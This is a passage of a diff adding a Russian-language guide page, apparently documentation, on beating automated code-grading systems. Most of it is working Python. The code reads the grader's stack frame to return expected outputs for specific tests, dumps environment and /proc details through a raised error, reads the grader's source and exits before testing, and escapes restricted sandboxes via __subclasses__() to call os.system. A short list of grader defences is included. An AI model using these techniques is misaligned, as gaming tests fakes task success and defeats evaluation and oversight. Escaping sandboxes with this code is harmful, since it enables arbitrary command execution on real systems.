+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>    <span class="n">exec</span><span class="p">(</span><span class="n">student_code</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;_check&quot;</span><span class="p">:</span> <span class="n">check</span><span class="p">})</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="c1"># Student code:</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="kn">import</span> <span class="nn">sys</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">frame</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">_getframe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="k">if</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_locals</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;test_number&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">f_locals</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;expected_output&quot;</span><span class="p">))</span>
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="k">else</span><span class="p">:</span>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;wrong&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>⚠️ Современные тестирующие системы изолируют student code через <code>exec(code, restricted_globals)</code> — <code>sys._getframe</code> возвращает фрейм <code>exec</code>, не тестирующего скрипта. Но если изоляция неполная — фрейм доступен.</p>
+<h2 id="b4">B.4. Интроспекция окружения тестирующих систем<a class="headerlink" href="#b4" title="Permanent link">#</a></h2>
+<p>Интроспекция окружения — запустить код в тестирующей системе и собрать <strong>всю</strong> информацию о окружении через один <code>raise</code>. Результат попадает в stderr, который система обычно показывает при ошибке.</p>
+<h3 id="universalnyy">Универсальный «комбайн» — собрать всё в JSON<a class="headerlink" href="#universalnyy" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">platform</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">info</span> <span class="o">=</span> <span class="p">{</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>    <span class="s2">&quot;sys.version&quot;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">version</span><span class="p">,</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>    <span class="s2">&quot;sys.executable&quot;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">executable</span><span class="p">,</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>    <span class="s2">&quot;sys.flags&quot;</span><span class="p">:</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">flags</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">k</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">)},</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>    <span class="s2">&quot;sys._xoptions&quot;</span><span class="p">:</span> <span class="nb">dict</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">_xoptions</span><span class="p">),</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>    <span class="s2">&quot;sys.path&quot;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="p">[:</span><span class="mi">20</span><span class="p">],</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>    <span class="s2">&quot;os.environ&quot;</span><span class="p">:</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="n">v</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="k">if</span> <span class="n">k</span><span class="o">.</span><span class="n">startswith</span><span class="p">((</span><span class="s2">&quot;PYTHON&quot;</span><span class="p">,</span> <span class="s2">&quot;PATH&quot;</span><span class="p">,</span> <span class="s2">&quot;HOME&quot;</span><span class="p">,</span> <span class="s2">&quot;USER&quot;</span><span class="p">))},</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>    <span class="s2">&quot;platform&quot;</span><span class="p">:</span> <span class="p">{</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>        <span class="s2">&quot;system&quot;</span><span class="p">:</span> <span class="n">platform</span><span class="o">.</span><span class="n">system</span><span class="p">(),</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>        <span class="s2">&quot;release&quot;</span><span class="p">:</span> <span class="n">platform</span><span class="o">.</span><span class="n">release</span><span class="p">(),</span>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>        <span class="s2">&quot;machine&quot;</span><span class="p">:</span> <span class="n">platform</span><span class="o">.</span><span class="n">machine</span><span class="p">(),</span>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>        <span class="s2">&quot;processor&quot;</span><span class="p">:</span> <span class="n">platform</span><span class="o">.</span><span class="n">processor</span><span class="p">(),</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>    <span class="p">},</span>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>    <span class="s2">&quot;modules&quot;</span><span class="p">:</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">keys</span><span class="p">())[:</span><span class="mi">200</span><span class="p">],</span>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>    <span class="s2">&quot;implementation&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">implementation</span><span class="p">),</span>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>    <span class="s2">&quot;pid&quot;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span>
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>    <span class="s2">&quot;ppid&quot;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">getppid</span><span class="p">(),</span>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>    <span class="s2">&quot;uid&quot;</span><span class="p">:</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s2">&quot;getuid&quot;</span><span class="p">,</span> <span class="k">lambda</span><span class="p">:</span> <span class="s2">&quot;N/A&quot;</span><span class="p">)(),</span>
+</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>    <span class="s2">&quot;gid&quot;</span><span class="p">:</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s2">&quot;getgid&quot;</span><span class="p">,</span> <span class="k">lambda</span><span class="p">:</span> <span class="s2">&quot;N/A&quot;</span><span class="p">)(),</span>
+</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a><span class="p">}</span>
+</span><span id="__span-17-23"><a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>
+</span><span id="__span-17-24"><a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="c1"># Linux-only:</span>
+</span><span id="__span-17-25"><a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a><span class="k">try</span><span class="p">:</span>
+</span><span id="__span-17-26"><a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/proc/self/cmdline&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-17-27"><a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>        <span class="n">info</span><span class="p">[</span><span class="s2">&quot;cmdline&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot; &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span id="__span-17-28"><a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/proc/1/cgroup&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-17-29"><a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a>        <span class="n">info</span><span class="p">[</span><span class="s2">&quot;cgroup&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">500</span><span class="p">]</span>
+</span><span id="__span-17-30"><a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a>    <span class="n">info</span><span class="p">[</span><span class="s2">&quot;dockerenv&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&quot;/.dockerenv&quot;</span><span class="p">)</span>
+</span><span id="__span-17-31"><a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a><span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span><span id="__span-17-32"><a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a>    <span class="k">pass</span>
+</span><span id="__span-17-33"><a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a>
+</span><span id="__span-17-34"><a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a><span class="c1"># Поднимаем как RuntimeError — попадёт в stderr тестирующей системы</span>
+</span><span id="__span-17-35"><a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a><span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;RECON_DUMP: </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">info</span><span class="p">,</span><span class="w"> </span><span class="n">default</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span><span class="w"> </span><span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>В логе тестирующей системы появится JSON со всем, что удалось собрать. Это даёт максимум разведки за одну попытку.</p>
+<h3 id="konkretnye">Конкретные проверки<a class="headerlink" href="#konkretnye" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Удаляет ли система комментарии?</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    <span class="n">has_comments</span> <span class="o">=</span> <span class="s2">&quot;SECRET_FLAG&quot;</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Если True — система не трогает комментарии, можно прятать в них</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="c1"># Какой тест сейчас выполняется?</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="n">frame</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">_getframe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">test_num</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_locals</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;test_number&quot;</span><span class="p">,</span> <span class="s2">&quot;unknown&quot;</span><span class="p">)</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c1"># Позволяет давать разные ответы на разные тесты</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="c1"># Какие библиотеки доступны?</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="k">for</span> <span class="n">mod</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&quot;numpy&quot;</span><span class="p">,</span> <span class="s2">&quot;pandas&quot;</span><span class="p">,</span> <span class="s2">&quot;requests&quot;</span><span class="p">,</span> <span class="s2">&quot;sympy&quot;</span><span class="p">,</span> <span class="s2">&quot;networkx&quot;</span><span class="p">]:</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>        <span class="nb">__import__</span><span class="p">(</span><span class="n">mod</span><span class="p">)</span>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>        <span class="n">available</span><span class="p">[</span><span class="n">mod</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>    <span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>        <span class="n">available</span><span class="p">[</span><span class="n">mod</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="c1"># Чтение исходника проверяющего скрипта:</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="kn">import</span> <span class="nn">inspect</span>
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="n">caller</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">_getframe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="n">caller_file</span> <span class="o">=</span> <span class="n">caller</span><span class="o">.</span><span class="n">f_code</span><span class="o">.</span><span class="n">co_filename</span>
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">caller_file</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>    <span class="n">source</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a><span class="nb">print</span><span class="p">(</span><span class="n">source</span><span class="p">[:</span><span class="mi">5000</span><span class="p">])</span>  <span class="c1"># первые 5 KB исходника проверяющего</span>
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># выйти до выполнения теста</span>
+</span></code></pre></div>
+<h3 id="zaschita">Защита тестирующих систем<a class="headerlink" href="#zaschita" title="Permanent link">#</a></h3>
+<p>Современные системы противодействуют разведке:</p>
+<ul>
+<li><strong><code>exec(code, restricted_globals)</code></strong> — <code>sys</code> недоступен, <code>__builtins__</code> урезан.</li>
+<li><strong>Sandbox через subprocess</strong> — student code в отдельном процессе, <code>sys._getframe</code> не видит родителя.</li>
+<li><strong>seccomp</strong> — системные вызовы ограничены, <code>open("/proc/...")</code> запрещён.</li>
+<li><strong>Время выполнения</strong> — если код работает &gt; 5 секунд, убивается.</li>
+<li><strong>Сравнение вывода</strong> — система проверяет stdout, не stderr (разведка через <code>raise</code> не видна).</li>
+</ul>
+<h2 id="b5-__subclasses__">B.5. Песочницы и обход через <code>__subclasses__()</code><a class="headerlink" href="#b5-__subclasses__" title="Permanent link">#</a></h2>
+<p>Классический приём обхода песочниц, которые вычищают <code>__builtins__</code> и запрещают <code>import</code>. Идея: <strong>из любого объекта</strong> можно добраться до <code>object</code> (базового класса всех классов), а оттуда — до <strong>любого класса в интепретаторе</strong>, включая <code>os._wrap_close</code>, <code>warnings.catch_warnings</code> и другие, у которых есть доступ к <code>os</code>/<code>sys</code>.</p>
+<h3 id="tsepochka">Цепочка: <code>().__class__.__base__.__subclasses__()</code><a class="headerlink" href="#tsepochka" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Шаг 1: () — пустой кортеж. Его тип — tuple.</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span>            <span class="c1"># &lt;class &#39;tuple&#39;&gt;</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># Шаг 2: __base__ — базовый класс tuple. Это object.</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>   <span class="c1"># &lt;class &#39;object&#39;&gt;</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># Шаг 3: __subclasses__() — все классы, прямо унаследованные от object.</span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c1"># [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, ...,</span>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="c1">#  &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, ...]</span>
+</span></code></pre></div>
+<p>Тот же трюк работает из <strong>любого</strong> объекта: <code>[].__class__.__base__.__subclasses__()</code>, <code>"".__class__.__base__.__subclasses__()</code>, <code>{}.__class__.__base__.__subclasses__()</code>, <code>(0).__class__.__base__.__subclasses__()</code> — все дадут один и тот же список, потому что <code>__base__</code> любого типа рано или поздно ведёт к <code>object</code>.</p>
+<h3 id="poisk">Поиск класса с доступом к <code>os</code><a class="headerlink" href="#poisk" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Найти os._wrap_close (он создаётся при os.popen и держит ссылку на os)</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="k">for</span> <span class="bp">cls</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>    <span class="k">if</span> <span class="bp">cls</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;_wrap_close&quot;</span><span class="p">:</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>        <span class="c1"># У этого класса в __init__ есть self.__init__.__globals__ —</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>        <span class="c1"># это globals модуля os!</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>        <span class="n">os_globals</span> <span class="o">=</span> <span class="bp">cls</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>        <span class="n">os</span> <span class="o">=</span> <span class="n">os_globals</span>  <span class="c1"># это словарь globals модуля os</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>        <span class="n">system</span> <span class="o">=</span> <span class="n">os</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>   <span class="c1"># функция os.system</span>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>        <span class="k">break</span>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="n">system</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>   <span class="c1"># обходим песочницу, выполняем произвольную команду</span>
+</span></code></pre></div>
+<h3 id="universalnyy">Универсальный «finder» — найти любой модуль в <code>__subclasses__</code><a class="headerlink" href="#universalnyy" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="k">def</span> <span class="nf">find_module_global</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="n">attr_name</span><span class="p">):</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Найти attr_name в globals любого класса, чей __init__ определён в module_name.&quot;&quot;&quot;</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>    <span class="k">for</span> <span class="bp">cls</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>            <span class="n">g</span> <span class="o">=</span> <span class="bp">cls</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>            <span class="k">if</span> <span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;__name__&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="n">module_name</span> <span class="ow">or</span> <span class="n">module_name</span> <span class="ow">in</span> <span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;__file__&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>                <span class="k">if</span> <span class="n">attr_name</span> <span class="ow">in</span> <span class="n">g</span><span class="p">:</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>                    <span class="k">return</span> <span class="n">g</span><span class="p">[</span><span class="n">attr_name</span><span class="p">]</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>        <span class="k">except</span> <span class="p">(</span><span class="ne">AttributeError</span><span class="p">,</span> <span class="ne">KeyError</span><span class="p">):</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>            <span class="k">continue</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>    <span class="k">raise</span> <span class="ne">LookupError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">module_name</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">attr_name</span><span class="si">}</span><span class="s2"> не найден&quot;</span><span class="p">)</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="n">system</span> <span class="o">=</span> <span class="n">find_module_global</span><span class="p">(</span><span class="s2">&quot;os&quot;</span><span class="p">,</span> <span class="s2">&quot;system&quot;</span><span class="p">)</span>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="n">system</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="alternativnye">Альтернативные пути обхода<a class="headerlink" href="#alternativnye" title="Permanent link">#</a></h3>
+<p>Даже если <code>__subclasses__()</code> заблокирован, остаются:</p>
